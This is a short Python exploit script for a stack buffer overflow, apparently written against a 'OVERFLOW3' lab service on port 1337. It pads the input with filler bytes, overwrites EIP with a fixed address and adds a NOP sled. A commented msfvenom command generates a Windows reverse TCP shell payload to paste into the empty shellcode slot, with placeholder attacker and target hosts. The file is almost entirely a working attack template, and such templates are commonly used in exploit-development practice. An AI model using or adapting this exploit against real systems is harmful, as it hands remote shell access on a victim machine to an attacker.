#!/usr/bin/env python3

import socket, time, sys

ip = "RHOST"

port = 1337
timeout = 5
prefix = "OVERFLOW3 "
filler = "A" * 1274
eip = "\x03\x12\x50\x62" 
nops = "\x90" * 10
# Generate Code
# msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f c -b "\x00\x11\x40\x5f\xb8\xee"
shell_code = ("")

string = prefix + filler + eip + nops + shell_code

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)
    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
except:
  print("Check your netcat listener!")
  sys.exit(0)
